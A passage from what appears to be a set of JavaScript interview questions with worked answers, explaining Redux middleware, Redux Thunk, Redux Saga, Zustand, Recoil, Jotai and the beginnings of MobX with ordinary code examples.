  
  return next(action);
};

Applying multiple middleware:
------------------------------

import { createStore, applyMiddleware } from 'redux';

const store = createStore(
  reducer,
  applyMiddleware(
    logger,
    crashReporter,
    analytics,
    actionValidator
  )
);

// Order matters! Actions flow through middleware in order:
// dispatch → logger → crashReporter → analytics → validator → reducer

Built-in middleware examples:
------------------------------

1. Redux Thunk (async actions):

// Allows dispatching functions instead of objects
const thunk = store => next => action => {
  if (typeof action === 'function') {
    return action(store.dispatch, store.getState);
  }
  
  return next(action);
};

// Usage
const fetchUser = (id) => {
  return async (dispatch, getState) => {
    dispatch({ type: 'FETCH_USER_START' });
    
    const user = await api.getUser(id);
    
    dispatch({ type: 'FETCH_USER_SUCCESS', payload: user });
  };
};

dispatch(fetchUser(123));  // Dispatching a function!

2. Redux Logger (development):

import logger from 'redux-logger';

const store = createStore(
  reducer,
  applyMiddleware(logger)
);

// Automatically logs all actions with colored output

3. Redux Promise:

// Handles promises as actions
const promiseMiddleware = store => next => action => {
  if (action.payload && typeof action.payload.then === 'function') {
    action.payload.then(
      result => store.dispatch({ ...action, payload: result }),
      error => store.dispatch({ ...action, payload: error, error: true })
    );
    return;
  }
  
  return next(action);
};

Custom middleware examples:
----------------------------

Example 1: API middleware

const api = store => next => action => {
  if (action.type !== 'API_REQUEST') {
    return next(action);
  }
  
  const { endpoint, method, body, onSuccess, onError } = action.payload;
  
  fetch(endpoint, { method, body: JSON.stringify(body) })
    .then(res => res.json())
    .then(data => store.dispatch({ type: onSuccess, payload: data }))
    .catch(error => store.dispatch({ type: onError, payload: error }));
};

// Usage
dispatch({
  type: 'API_REQUEST',
  payload: {
    endpoint: '/api/users',
    method: 'POST',
    body: { name: 'Alice' },
    onSuccess: 'CREATE_USER_SUCCESS',
    onError: 'CREATE_USER_ERROR'
  }
});

Example 2: Local storage sync

const localStorageMiddleware = store => next => action => {
  const result = next(action);
  
  // Save state to localStorage after every action
  const state = store.getState();
  localStorage.setItem('reduxState', JSON.stringify(state));
  
  return result;
};

Example 3: Debounce middleware

const debounce = store => next => action => {
  if (!action.meta || !action.meta.debounce) {
    return next(action);
  }
  
  clearTimeout(action.meta.debounce.timer);
  
  action.meta.debounce.timer = setTimeout(() => {
    next(action);
  }, action.meta.debounce.delay);
};

// Usage
dispatch({
  type: 'SEARCH',
  payload: query,
  meta: {
    debounce: { delay: 500 }
  }
});

Example 4: Router middleware

const routerMiddleware = store => next => action => {
  if (action.type === 'NAVIGATE') {
    window.history.pushState({}, '', action.payload.url);
  }
  
  return next(action);
};

Middleware composition (chaining):
-----------------------------------

// Multiple middleware process action in sequence

const middleware1 = store => next => action => {
  console.log('Middleware 1: before');
  const result = next(action);
  console.log('Middleware 1: after');
  return result;
};

const middleware2 = store => next => action => {
  console.log('Middleware 2: before');
  const result = next(action);
  console.log('Middleware 2: after');
  return result;
};

applyMiddleware(middleware1, middleware2);

// Output when dispatching:
// Middleware 1: before
// Middleware 2: before
// (reducer processes action)
// Middleware 2: after
// Middleware 1: after

Redux Toolkit's configureStore:
--------------------------------

import { configureStore } from '@reduxjs/toolkit';

const store = configureStore({
  reducer: rootReducer,
  middleware: (getDefaultMiddleware) =>
    getDefaultMiddleware().concat(
      logger,
      analytics
    )
});

// getDefaultMiddleware includes:
// - redux-thunk (for async)
// - Immutability check (development)
// - Serializ ability check (development)

When to use middleware:
-----------------------

✅ Async operations (API calls)
✅ Logging and debugging
✅ Analytics tracking
✅ Error reporting
✅ Action transformation
✅ Side effects (routing, local storage)
✅ Action validation
✅ Rate limiting/debouncing

Common middleware patterns:
---------------------------

1. Conditional execution:

const conditionalMiddleware = store => next => action => {
  if (condition) {
    return next(action);
  }
  // Skip action
};

2. Action transformation:

const transformMiddleware = store => next => action => {
  const transformedAction = {
    ...action,
    timestamp: Date.now()
  };
  return next(transformedAction);
};

3. Dispatching additional actions:

const sideEffectMiddleware = store => next => action => {
  if (action.type === 'USER_LOGIN') {
    // Dispatch additional action
    store.dispatch({ type: 'FETCH_USER_PROFILE', id: action.payload.id });
  }
  
  return next(action);
};

4. Async operations:

const asyncMiddleware = store => next => action => {
  if (action.type === 'ASYNC_ACTION') {
    someAsyncOperation()
      .then(result => store.dispatch({ type: 'SUCCESS', payload: result }))
      .catch(error => store.dispatch({ type: 'ERROR', payload: error }));
    return;
  }
  
  return next(action);
};

Summary:

Middleware:
- Intercepts actions between dispatch and reducer
- Extends Redux functionality
- Signature: store => next => action => {}
- Can inspect, modify, stop, or dispatch actions
- Applied with applyMiddleware()
- Common uses: async, logging, analytics, error tracking
- Order matters (forms a chain)
- Redux Toolkit includes thunk middleware by default
*/


/**
48. What is Redux Thunk and how does asynchronous dispatch work?
----------------------------------------------------------------

Redux Thunk is middleware that allows you to dispatch functions (thunks) instead of
plain action objects. These functions can perform async operations and dispatch
actions when ready.

Problem without Thunk:
----------------------

// Actions must be plain objects
dispatch({ type: 'INCREMENT' });  // ✅ Works

// Can't dispatch async operations
dispatch(async () => {  // ❌ Doesn't work
  const data = await fetch('/api/data');
  return { type: 'FETCH_SUCCESS', payload: data };
});

Solution with Thunk:
--------------------

Redux Thunk lets you dispatch functions that receive `dispatch` and `getState`:

// Thunk action creator (returns a function, not an object)
const fetchUser = (userId) => {
  return async (dispatch, getState) => {
    // Can dispatch actions
    dispatch({ type: 'FETCH_USER_START' });
    
    try {
      const response = await fetch(`/api/users/${userId}`);
      const user = await response.json();
      
      dispatch({ type: 'FETCH_USER_SUCCESS', payload: user });
    } catch (error) {
      dispatch({ type: 'FETCH_USER_ERROR', payload: error.message });
    }
  };
};

// Dispatch the thunk
dispatch(fetchUser(123));

How Thunk works internally:
----------------------------

// Simplified Thunk middleware implementation
const thunk = store => next => action => {
  // If action is a function, call it with dispatch and getState
  if (typeof action === 'function') {
    return action(store.dispatch, store.getState);
  }
  
  // Otherwise, pass action to next middleware
  return next(action);
};

Installation and setup:
-----------------------

// Install
npm install redux-thunk

// Apply middleware
import { createStore, applyMiddleware } from 'redux';
import thunk from 'redux-thunk';

const store = createStore(
  rootReducer,
  applyMiddleware(thunk)
);

// With Redux Toolkit (thunk included by default)
import { configureStore } from '@reduxjs/toolkit';

const store = configureStore({
  reducer: rootReducer
  // thunk middleware automatically included
});

Basic async example:
--------------------

// Action types
const FETCH_USERS_START = 'FETCH_USERS_START';
const FETCH_USERS_SUCCESS = 'FETCH_USERS_SUCCESS';
const FETCH_USERS_ERROR = 'FETCH_USERS_ERROR';

// Thunk action creator
const fetchUsers = () => {
  return async (dispatch) => {
    // Start loading
    dispatch({ type: FETCH_USERS_START });
    
    try {
      const response = await fetch('/api/users');
      const users = await response.json();
      
      // Success
      dispatch({
        type: FETCH_USERS_SUCCESS,
        payload: users
      });
    } catch (error) {
      // Error
      dispatch({
        type: FETCH_USERS_ERROR,
        payload: error.message
      });
    }
  };
};

// Reducer
const initialState = {
  users: [],
  loading: false,
  error: null
};

function usersReducer(state = initialState, action) {
  switch (action.type) {
    case FETCH_USERS_START:
      return { ...state, loading: true, error: null };
    case FETCH_USERS_SUCCESS:
      return { ...state, loading: false, users: action.payload };
    case FETCH_USERS_ERROR:
      return { ...state, loading: false, error: action.payload };
    default:
      return state;
  }
}

// Component
function UserList() {
  const dispatch = useDispatch();
  const { users, loading, error } = useSelector(state => state.users);
  
  useEffect(() => {
    dispatch(fetchUsers());  // Dispatch thunk
  }, [dispatch]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  
  return (
    <ul>
      {users.map(user => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
}

Using getState for conditional logic:
--------------------------------------

const fetchUserIfNeeded = (userId) => {
  return (dispatch, getState) => {
    const state = getState();
    const user = state.users.byId[userId];
    
    // Only fetch if user not already in state
    if (!user) {
      dispatch(fetchUser(userId));
    }
  };
};

Chaining thunks:
----------------

const login = (credentials) => {
  return async (dispatch) => {
    dispatch({ type: 'LOGIN_START' });
    
    const user = await loginAPI(credentials);
    dispatch({ type: 'LOGIN_SUCCESS', payload: user });
    
    // Dispatch another thunk after login
    dispatch(fetchUserProfile(user.id));
    dispatch(fetchUserSettings(user.id));
  };
};

Returning values from thunks:
------------------------------

const fetchUser = (userId) => {
  return async (dispatch) => {
    dispatch({ type: 'FETCH_USER_START' });
    
    const user = await api.getUser(userId);
    dispatch({ type: 'FETCH_USER_SUCCESS', payload: user });
    
    return user;  // Can return value
  };
};

// Component can use returned value
const handleClick = async () => {
  const user = await dispatch(fetchUser(123));
  console.log('Fetched user:', user);
};

Error handling patterns:
-------------------------

Pattern 1: Try/catch in thunk

const fetchData = () => {
  return async (dispatch) => {
    try {
      const data = await api.getData();
      dispatch({ type: 'SUCCESS', payload: data });
    } catch (error) {
      dispatch({ type: 'ERROR', payload: error.message });
    }
  };
};

Pattern 2: Global error handler

const apiMiddleware = store => next => action => {
  try {
    return next(action);
  } catch (error) {
    store.dispatch({ type: 'GLOBAL_ERROR', payload: error });
  }
};

Pattern 3: Error action creator

const handleError = (error) => ({
  type: 'ERROR',
  payload: { message: error.message, stack: error.stack }
});

const fetchData = () => {
  return async (dispatch) => {
    try {
      const data = await api.getData();
      dispatch({ type: 'SUCCESS', payload: data });
    } catch (error) {
      dispatch(handleError(error));
    }
  };
};

Advanced patterns:
------------------

Pattern 1: Debounced search

let searchTimer;

const searchUsers = (query) => {
  return (dispatch) => {
    clearTimeout(searchTimer);
    
    searchTimer = setTimeout(() => {
      dispatch(fetchSearchResults(query));
    }, 500);
  };
};

Pattern 2: Polling

const startPolling = () => {
  return (dispatch) => {
    const poll = () => {
      dispatch(fetchData());
      setTimeout(poll, 5000);  // Poll every 5 seconds
    };
    
    poll();
  };
};

Pattern 3: Optimistic updates

const updateTodo = (id, updates) => {
  return async (dispatch) => {
    // Optimistically update UI
    dispatch({ type: 'UPDATE_TODO_OPTIMISTIC', id, updates });
    
    try {
      await api.updateTodo(id, updates);
      dispatch({ type: 'UPDATE_TODO_SUCCESS', id, updates });
    } catch (error) {
      // Revert on error
      dispatch({ type: 'UPDATE_TODO_REVERT', id });
      dispatch({ type: 'UPDATE_TODO_ERROR', error });
    }
  };
};

Pattern 4: Sequential async operations

const setupUserAccount = (userData) => {
  return async (dispatch) => {
    // Step 1: Create user
    const user = await api.createUser(userData);
    dispatch({ type: 'USER_CREATED', payload: user });
    
    // Step 2: Create profile
    const profile = await api.createProfile(user.id);
    dispatch({ type: 'PROFILE_CREATED', payload: profile });
    
    // Step 3: Send welcome email
    await api.sendWelcomeEmail(user.email);
    dispatch({ type: 'WELCOME_EMAIL_SENT' });
  };
};

Pattern 5: Parallel async operations

const loadDashboard = () => {
  return async (dispatch) => {
    dispatch({ type: 'LOAD_DASHBOARD_START' });
    
    // Fetch multiple things in parallel
    const [users, posts, comments] = await Promise.all([
      api.getUsers(),
      api.getPosts(),
      api.getComments()
    ]);
    
    dispatch({ type: 'USERS_LOADED', payload: users });
    dispatch({ type: 'POSTS_LOADED', payload: posts });
    dispatch({ type: 'COMMENTS_LOADED', payload: comments });
    
    dispatch({ type: 'LOAD_DASHBOARD_COMPLETE' });
  };
};

Testing thunks:
---------------

// Test with mock dispatch
test('fetchUsers dispatches correct actions', async () => {
  const dispatch = jest.fn();
  const thunk = fetchUsers();
  
  await thunk(dispatch);
  
  expect(dispatch).toHaveBeenCalledWith({ type: 'FETCH_USERS_START' });
  expect(dispatch).toHaveBeenCalledWith({
    type: 'FETCH_USERS_SUCCESS',
    payload: expect.any(Array)
  });
});

// Test with redux-mock-store
import configureMockStore from 'redux-mock-store';
import thunk from 'redux-thunk';

const mockStore = configureMockStore([thunk]);

test('fetchUsers', async () => {
  const store = mockStore({});
  
  await store.dispatch(fetchUsers());
  
  const actions = store.getActions();
  expect(actions[0]).toEqual({ type: 'FETCH_USERS_START' });
  expect(actions[1].type).toBe('FETCH_USERS_SUCCESS');
});

Modern alternative (RTK Query):
--------------------------------

Redux Toolkit includes RTK Query, which handles async state automatically:

import { createApi, fetchBaseQuery } from '@reduxjs/toolkit/query/react';

const api = createApi({
  baseQuery: fetchBaseQuery({ baseUrl: '/api' }),
  endpoints: (builder) => ({
    getUsers: builder.query({
      query: () => 'users'
    }),
    createUser: builder.mutation({
      query: (user) => ({
        url: 'users',
        method: 'POST',
        body: user
      })
    })
  })
});

// Auto-generated hooks
const { useGetUsersQuery, useCreateUserMutation } = api;

// Component
function Users() {
  const { data, isLoading, error } = useGetUsersQuery();
  // No thunks needed!
}

When to use Thunk:
------------------

✅ Async operations (API calls)
✅ Access to current state (getState)
✅ Conditional dispatching
✅ Complex async workflows
✅ Legacy Redux code

When to use alternatives:
-------------------------

- RTK Query: Server state, caching, automatic refetching
- Redux Saga: Complex async flows, cancellation, debouncing
- Redux Observable: RxJS-based reactive programming

Summary:

Redux Thunk:
- Middleware for async actions
- Dispatch functions instead of objects
- Functions receive dispatch and getState
- Simple solution for most async needs
- Included in Redux Toolkit by default
- Good for: API calls, conditional logic, sequential operations
- Alternative: RTK Query for server state
*/


/**
49. What is Redux Saga and how does it differ from Thunk?
---------------------------------------------------------

Redux Saga is middleware that handles side effects using generator functions. It
provides more control over async flows than Thunk, with features like cancellation,
debouncing, parallel execution, and testing.

Key differences: Thunk vs Saga
-------------------------------

Redux Thunk:
- Dispatches functions
- Uses async/await or promises
- Simple, straightforward
- Limited control over async flows
- Good for simple async operations

Redux Saga:
- Uses generator functions (function*)
- Declarative effects (put, call, take, etc.)
- Advanced async control (cancel, debounce, race, throttle)
- Testable without mocking
- Better for complex async workflows

Basic Saga example:
-------------------

// Saga (generator function)
import { call, put, takeEvery } from 'redux-saga/effects';

function* fetchUserSaga(action) {
  try {
    // put = dispatch action
    yield put({ type: 'FETCH_USER_START' });
    
    // call = call function (API, etc.)
    const user = yield call(api.getUser, action.payload.userId);
    
    yield put({ type: 'FETCH_USER_SUCCESS', payload: user });
  } catch (error) {
    yield put({ type: 'FETCH_USER_ERROR', payload: error.message });
  }
}

// Watcher saga
function* watchFetchUser() {
  // takeEvery = listen for every FETCH_USER action
  yield takeEvery('FETCH_USER', fetchUserSaga);
}

// Root saga
function* rootSaga() {
  yield all([
    watchFetchUser(),
    // other sagas...
  ]);
}

// Setup
import createSagaMiddleware from 'redux-saga';

const sagaMiddleware = createSagaMiddleware();
const store = createStore(
  reducer,
  applyMiddleware(sagaMiddleware)
);

sagaMiddleware.run(rootSaga);

// Dispatch normal action (saga intercepts it)
dispatch({ type: 'FETCH_USER', payload: { userId: 123 } });

Same example with Thunk:
-------------------------

const fetchUser = (userId) => {
  return async (dispatch) => {
    dispatch({ type: 'FETCH_USER_START' });
    
    try {
      const user = await api.getUser(userId);
      dispatch({ type: 'FETCH_USER_SUCCESS', payload: user });
    } catch (error) {
      dispatch({ type: 'FETCH_USER_ERROR', payload: error.message });
    }
  };
};

dispatch(fetchUser(123));

Saga effects:
-------------

1. call - Call function (API, etc.)

yield call(api.getUser, userId);
// Equivalent to: await api.getUser(userId)

2. put - Dispatch action

yield put({ type: 'SUCCESS', payload: data });
// Equivalent to: dispatch({ type: 'SUCCESS', payload: data })

3. take - Wait for action

const action = yield take('USER_LOGIN');
// Pauses until USER_LOGIN action dispatched

4. takeEvery - Listen to every action

yield takeEvery('FETCH_USER', fetchUserSaga);
// Runs fetchUserSaga for every FETCH_USER action

5. takeLatest - Cancel previous, take latest

yield takeLatest('SEARCH', searchSaga);
// If SEARCH dispatched while previous still running, cancel previous

6. select - Get state

const user = yield select(state => state.user);
// Equivalent to: getState().user

7. fork - Non-blocking call (run in background)

yield fork(backgroundTask);
// Continues without waiting

8. spawn - Detached fork

yield spawn(independentTask);
// Runs independently, errors don't bubble up

9. cancel - Cancel task

const task = yield fork(longRunningTask);
yield cancel(task);  // Stop it

10. race - Race multiple effects

const { response, timeout } = yield race({
  response: call(api.getData),
  timeout: delay(5000)
});

11. all - Run in parallel

const [users, posts] = yield all([
  call(api.getUsers),
  call(api.getPosts)
]);

12. delay - Wait for time

yield delay(1000);  // Wait 1 second

Advanced Saga patterns:
-----------------------

Pattern 1: Debouncing

function* searchSaga(action) {
  // Wait 500ms before executing
  yield delay(500);
  const results = yield call(api.search, action.payload);
  yield put({ type: 'SEARCH_SUCCESS', payload: results });
}

function* watchSearch() {
  yield debounce(500, 'SEARCH', searchSaga);
  // Auto-debounces: waits 500ms after last action
}

Pattern 2: Cancellation

function* backgroundSync() {
  while (true) {
    const data = yield call(api.sync);
    yield put({ type: 'SYNC_SUCCESS', payload: data });
    yield delay(5000);  // Sync every 5 seconds
  }
}

function* watchSync() {
  while (true) {
    yield take('START_SYNC');
    const syncTask = yield fork(backgroundSync);
    
    yield take('STOP_SYNC');
    yield cancel(syncTask);  // Stop syncing
  }
}

Pattern 3: Racing effects

function* fetchWithTimeout() {
  const { data, timeout } = yield race({
    data: call(api.getData),
    timeout: delay(5000)
  });
  
  if (timeout) {
    yield put({ type: 'FETCH_TIMEOUT' });
  } else {
    yield put({ type: 'FETCH_SUCCESS', payload: data });
  }
}

Pattern 4: Retry logic

function* fetchWithRetry() {
  for (let i = 0; i < 3; i++) {
    try {
      const data = yield call(api.getData);
      yield put({ type: 'SUCCESS', payload: data });
      return;
    } catch (error) {
      if (i < 2) {
        yield delay(1000 * (i + 1));  // Exponential backoff
      }
    }
  }
  
  yield put({ type: 'ERROR', payload: 'Failed after 3 retries' });
}

Pattern 5: Polling

function* pollData() {
  while (true) {
    try {
      const data = yield call(api.getData);
      yield put({ type: 'DATA_UPDATED', payload: data });
      yield delay(3000);  // Poll every 3 seconds
    } catch (error) {
      yield put({ type: 'POLL_ERROR', payload: error });
      break;
    }
  }
}

function* watchPolling() {
  while (true) {
    yield take('START_POLLING');
    const pollingTask = yield fork(pollData);
    
    yield take('STOP_POLLING');
    yield cancel(pollingTask);
  }
}

Pattern 6: Parallel requests

function* loadDashboard() {
  try {
    // Fetch in parallel
    const [users, posts, stats] = yield all([
      call(api.getUsers),
      call(api.getPosts),
      call(api.getStats)
    ]);
    
    yield put({ type: 'DASHBOARD_LOADED', payload: { users, posts, stats } });
  } catch (error) {
    yield put({ type: 'DASHBOARD_ERROR', payload: error });
  }
}

Pattern 7: Sequential flow with dependencies

function* setupUser() {
  // Step 1: Create user
  const user = yield call(api.createUser, userData);
  yield put({ type: 'USER_CREATED', payload: user });
  
  // Step 2: Create profile (depends on user.id)
  const profile = yield call(api.createProfile, user.id);
  yield put({ type: 'PROFILE_CREATED', payload: profile });
  
  // Step 3: Send email
  yield call(api.sendEmail, user.email);
  yield put({ type: 'SETUP_COMPLETE' });
}

Pattern 8: Optimistic updates with rollback

function* updateTodo(action) {
  const { id, updates } = action.payload;
  
  // Get original for rollback
  const original = yield select(state => 
    state.todos.find(t => t.id === id)
  );
  
  // Optimistic update
  yield put({ type: 'UPDATE_TODO_OPTIMISTIC', id, updates });
  
  try {
    yield call(api.updateTodo, id, updates);
    yield put({ type: 'UPDATE_TODO_SUCCESS' });
  } catch (error) {
    // Rollback on error
    yield put({ type: 'UPDATE_TODO_ROLLBACK', id, original });
    yield put({ type: 'UPDATE_TODO_ERROR', error });
  }
}

Testing Sagas:
--------------

Sagas are easy to test without mocking:

import { call, put } from 'redux-saga/effects';

function* fetchUser(action) {
  const user = yield call(api.getUser, action.userId);
  yield put({ type: 'FETCH_USER_SUCCESS', payload: user });
}

// Test
test('fetchUser saga', () => {
  const gen = fetchUser({ userId: 123 });
  
  // Test API call
  expect(gen.next().value).toEqual(
    call(api.getUser, 123)
  );
  
  // Test dispatch
  expect(gen.next(mockUser).value).toEqual(
    put({ type: 'FETCH_USER_SUCCESS', payload: mockUser })
  );
  
  // Test done
  expect(gen.next().done).toBe(true);
});

Compare: Testing Thunk (needs mocking):

test('fetchUser thunk', async () => {
  const dispatch = jest.fn();
  const mockApi = jest.fn().mockResolvedValue(mockUser);
  
  await fetchUser(123)(dispatch);
  
  expect(mockApi).toHaveBeenCalledWith(123);
  expect(dispatch).toHaveBeenCalledWith({ 
    type: 'FETCH_USER_SUCCESS', 
    payload: mockUser 
  });
});

When to use Saga vs Thunk:
---------------------------

Use Redux Saga when:
✅ Complex async workflows
✅ Need cancellation
✅ Debouncing/throttling
✅ Polling
✅ Racing conditions
✅ Advanced testing requirements
✅ Background tasks
✅ Sequential/parallel orchestration

Use Redux Thunk when:
✅ Simple async operations
✅ Quick API calls
✅ Learning Redux
✅ Small/medium apps
✅ Team unfamiliar with generators
✅ Less boilerplate needed

Comparison table:
-----------------

Feature          | Thunk           | Saga
-----------------|-----------------|------------------
Learning curve   | Low             | High (generators)
Boilerplate      | Low             | High
Testability      | Needs mocking   | Pure, easy
Cancellation     | Manual          | Built-in
Debouncing       | Manual          | Built-in (debounce)
Polling          | Manual          | Built-in (while loop)
Racing           | Promise.race    | race() effect
Parallel         | Promise.all     | all() effect
Sequential       | async/await     | yield
Code style       | Imperative      | Declarative

Migration example:
------------------

// Thunk
const fetchUser = (id) => async (dispatch) => {
  dispatch({ type: 'START' });
  try {
    const user = await api.getUser(id);
    dispatch({ type: 'SUCCESS', payload: user });
  } catch (error) {
    dispatch({ type: 'ERROR', payload: error });
  }
};

// Equivalent Saga
function* fetchUserSaga(action) {
  yield put({ type: 'START' });
  try {
    const user = yield call(api.getUser, action.payload.id);
    yield put({ type: 'SUCCESS', payload: user });
  } catch (error) {
    yield put({ type: 'ERROR', payload: error });
  }
}

function* watchFetchUser() {
  yield takeEvery('FETCH_USER', fetchUserSaga);
}

Summary:

Redux Saga:
- Uses generator functions (function*)
- Declarative effects (call, put, take, etc.)
- Advanced async control (cancel, race, debounce)
- Easy to test (no mocking)
- Better for complex workflows
- Steeper learning curve
- More boilerplate

Redux Thunk:
- Simple async/await
- Less boilerplate
- Easier to learn
- Good for simple cases
- Needs mocking for tests

Choose Saga for complex apps with advanced async needs.
Choose Thunk for simple apps or when learning Redux.
*/


/**
50. What is Zustand, Recoil, or Jotai (modern state managers)?
--------------------------------------------------------------

These are modern state management libraries that provide simpler alternatives to Redux
with less boilerplate and better DX (developer experience).

Zustand:
--------

Lightweight state management with a hooks-based API. No providers, no boilerplate.

Installation:
npm install zustand

Basic usage:

import create from 'zustand';

// Create store
const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
  decrement: () => set((state) => ({ count: state.count - 1 })),
  reset: () => set({ count: 0 })
}));

// Use in component
function Counter() {
  const count = useStore((state) => state.count);
  const increment = useStore((state) => state.increment);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={increment}>+</button>
    </div>
  );
}

Features:

1. No providers needed:
   // No <Provider> wrapper!
   function App() {
     return <Counter />;
   }

2. Async actions built-in:
   const useStore = create((set) => ({
     users: [],
     fetchUsers: async () => {
       const response = await fetch('/api/users');
       const users = await response.json();
       set({ users });
     }
   }));

3. Middleware:
   import { persist } from 'zustand/middleware';
   
   const useStore = create(
     persist(
       (set) => ({
         count: 0,
         increment: () => set((state) => ({ count: state.count + 1 }))
       }),
       { name: 'counter-storage' }  // localStorage key
     )
   );

4. Devtools:
   import { devtools } from 'zustand/middleware';
   
   const useStore = create(
     devtools((set) => ({
       count: 0,
       increment: () => set((state) => ({ count: state.count + 1 }))
     }))
   );

5. Slices pattern:
   const createUserSlice = (set) => ({
     user: null,
     setUser: (user) => set({ user })
   });
   
   const createTodosSlice = (set) => ({
     todos: [],
     addTodo: (todo) => set((state) => ({ todos: [...state.todos, todo] }))
   });
   
   const useStore = create((set) => ({
     ...createUserSlice(set),
     ...createTodosSlice(set)
   }));

Recoil:
-------

Facebook's experimental state management focused on atomic state and derived state.

Installation:
npm install recoil

Basic usage:

import { atom, selector, useRecoilState, useRecoilValue } from 'recoil';

// Atom (piece of state)
const countState = atom({
  key: 'countState',  // Unique ID
  default: 0
});

// Selector (derived state)
const doubledState = selector({
  key: 'doubledState',
  get: ({ get }) => {
    const count = get(countState);
    return count * 2;
  }
});

// Wrap app with RecoilRoot
import { RecoilRoot } from 'recoil';

function App() {
  return (
    <RecoilRoot>
      <Counter />
    </RecoilRoot>
  );
}

// Use in component
function Counter() {
  const [count, setCount] = useRecoilState(countState);
  const doubled = useRecoilValue(doubledState);
  
  return (
    <div>
      <p>Count: {count}</p>
      <p>Doubled: {doubled}</p>
      <button onClick={() => setCount(c => c + 1)}>+</button>
    </div>
  );
}

Features:

1. Atomic state:
   const userState = atom({
     key: 'user',
     default: null
   });
   
   const themeState = atom({
     key: 'theme',
     default: 'light'
   });

2. Derived state (selectors):
   const filteredTodosState = selector({
     key: 'filteredTodos',
     get: ({ get }) => {
       const todos = get(todosState);
       const filter = get(filterState);
       
       return todos.filter(todo => {
         if (filter === 'completed') return todo.completed;
         if (filter === 'active') return !todo.completed;
         return true;
       });
     }
   });

3. Async selectors:
   const userInfoState = selector({
     key: 'userInfo',
     get: async ({ get }) => {
       const userId = get(userIdState);
       const response = await fetch(`/api/users/${userId}`);
       return response.json();
     }
   });

4. Atom families (dynamic atoms):
   const todoState = atomFamily({
     key: 'todo',
     default: (id) => ({
       id,
       text: '',
       completed: false
     })
   });
   
   // Use
   const [todo1, setTodo1] = useRecoilState(todoState(1));
   const [todo2, setTodo2] = useRecoilState(todoState(2));

5. Suspense support:
   function UserProfile() {
     const user = useRecoilValue(userInfoState);  // Suspends while loading
     
     return <div>{user.name}</div>;
   }
   
   function App() {
     return (
       <Suspense fallback={<Loading />}>
         <UserProfile />
       </Suspense>
     );
   }

Jotai:
------

Primitive and flexible state management inspired by Recoil but simpler.

Installation:
npm install jotai

Basic usage:

import { atom, useAtom } from 'jotai';

// Create atom
const countAtom = atom(0);

// Use in component
function Counter() {
  const [count, setCount] = useAtom(countAtom);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(c => c + 1)}>+</button>
    </div>
  );
}

Features:

1. No keys required (unlike Recoil):
   const countAtom = atom(0);  // That's it!

2. Derived atoms:
   const doubledAtom = atom((get) => get(countAtom) * 2);

3. Write-only atoms:
   const incrementAtom = atom(
     null,  // No read
     (get, set) => set(countAtom, get(countAtom) + 1)
   );
   
   // Use
   const increment = useSetAtom(incrementAtom);
   <button onClick={increment}>+</button>

4. Async atoms:
   const userAtom = atom(async (get) => {
     const userId = get(userIdAtom);
     const response = await fetch(`/api/users/${userId}`);
     return response.json();
   });

5. Atom families:
   import { atomFamily } from 'jotai/utils';
   
   const todoAtomFamily = atomFamily((id) =>
     atom({ id, text: '', completed: false })
   );

6. Utils:
   import { atomWithStorage } from 'jotai/utils';
   
   const darkModeAtom = atomWithStorage('darkMode', false);

Comparison:
-----------

Zustand:
+ Simplest API
+ No providers
+ Built-in middleware
+ Great TypeScript support
- Less opinionated structure

Recoil:
+ Atomic state model
+ Powerful selectors
+ Suspense integration
+ Good for complex derived state
- Experimental
- Requires Provider
- More boilerplate

Jotai:
+ Minimal API
+ No keys (unlike Recoil)
+ TypeScript-first
+ Primitive and composable
- Smaller ecosystem

Redux:
+ Battle-tested
+ Huge ecosystem
+ DevTools
+ Middleware
- Most boilerplate
- Steeper learning curve

Feature comparison:
-------------------

Feature          | Zustand | Recoil  | Jotai   | Redux
-----------------|---------|---------|---------|--------
Provider         | No      | Yes     | Optional| Yes
Boilerplate      | Low     | Medium  | Low     | High
DevTools         | Yes     | Yes     | Yes     | Yes
Async            | Built-in| Selector| Atom    | Middleware
Derived state    | Manual  | Selector| Atom    | Manual/Reselect
Bundle size      | 1.2KB   | 79KB    | 3KB     | 3KB(+libs)
Learning curve   | Low     | Medium  | Low     | High

When to use which:
------------------

Zustand:
✅ Small to medium apps
✅ Want simplicity
✅ Don't need atomic state
✅ Quick setup

Recoil:
✅ Complex derived state
✅ Need Suspense integration
✅ Facebook ecosystem
✅ Experimental features OK

Jotai:
✅ TypeScript projects
✅ Minimal bundle size
✅ Want atomic state (simpler than Recoil)
✅ Flexible architecture

Redux:
✅ Large enterprise apps
✅ Team knows Redux
✅ Need strict patterns
✅ Extensive debugging needs

Summary:

Modern state managers offer:
- Less boilerplate than Redux
- Hooks-based APIs
- Better TypeScript support
- Smaller bundle sizes
- Simpler setup

Choose based on:
- Team familiarity
- App complexity
- Bundle size requirements
- Feature needs (Suspense, middleware, etc.)
*/



/**
51. What is MobX and how does observable state work?
----------------------------------------------------

MobX is a state management library based on reactive programming and observables.
It automatically tracks dependencies and updates components when observable state changes.

Core Philosophy:
"Anything that can be derived from the application state, should be derived. Automatically."

Unlike Redux (manual actions/reducers), MobX uses observables that automatically
trigger reactions when state changes.

Installation:
-------------

npm install mobx mobx-react-lite

Core Concepts:
--------------

1. Observable: State that MobX tracks
2. Actions: Functions that modify observables
3. Computed: Derived values that auto-update
4. Reactions: Side effects that run when observables change
5. Observer: React components that auto re-render

How Observable State Works:
----------------------------

MobX uses ES6 Proxies to intercept property access and modifications.
When you read an observable, MobX records the dependency.
When you write to an observable, MobX notifies all dependents.

Think of it like a spreadsheet:
- Cells are observables
- Formulas are computed values
- When a cell changes, formulas automatically recalculate

Basic Example:
--------------

import { makeObservable, observable, action, computed } from 'mobx';
import { observer } from 'mobx-react-lite';

// Create observable store (class-based)
class CounterStore {
  count = 0;
  
  constructor() {
    makeObservable(this, {
      count: observable,      // Make count trackable
      increment: action,      // Mark as action
      decrement: action,
      doubleCount: computed   // Derived value
    });
  }
  
  increment() {
    this.count += 1;  // Direct mutation! (MobX allows this)
  }
  
  decrement() {
    this.count -= 1;
  }
  
  get doubleCount() {
    return this.count * 2;  // Auto-recalculates when count changes
  }
}

// Create store instance
const counterStore = new CounterStore();

// Observer component (auto re-renders when observables change)
const Counter = observer(() => {
  return (
    <div>
      <h1>Count: {counterStore.count}</h1>
      <h2>Double: {counterStore.doubleCount}</h2>
      <button onClick={() => counterStore.increment()}>+</button>
